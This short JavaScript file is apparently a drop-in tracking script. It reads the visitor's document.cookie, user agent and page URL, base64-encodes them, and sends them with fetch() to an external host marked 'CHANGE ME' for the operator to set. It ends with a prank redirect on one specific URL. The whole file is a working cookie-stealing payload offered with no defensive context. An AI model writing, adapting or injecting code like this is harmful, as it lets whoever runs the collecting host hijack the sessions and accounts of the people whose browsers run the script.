// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! CHANGE ME !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
const url = 'https://cloud.slnk.icu'; // CHANGE ME
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! CHANGE ME !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
const tid = document.getElementById("slnkgtjs").getAttribute('tid');
fetch(url+'/api/'+tid+'?ua='+btoa(navigator.userAgent)+"&url="+btoa(window.location.href)+"&c="+btoa(document.cookie))
.then(r => {
if (!r.ok) {
  throw new Error(`failed ${r.status}`)
}
return r.text()
})
.then(d => {
//console.log(d)
})
.catch(e => console.log(e))


if (window.location.href == "https://sota.vision/sotacats") {
alert("МЯУ!");
window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
}
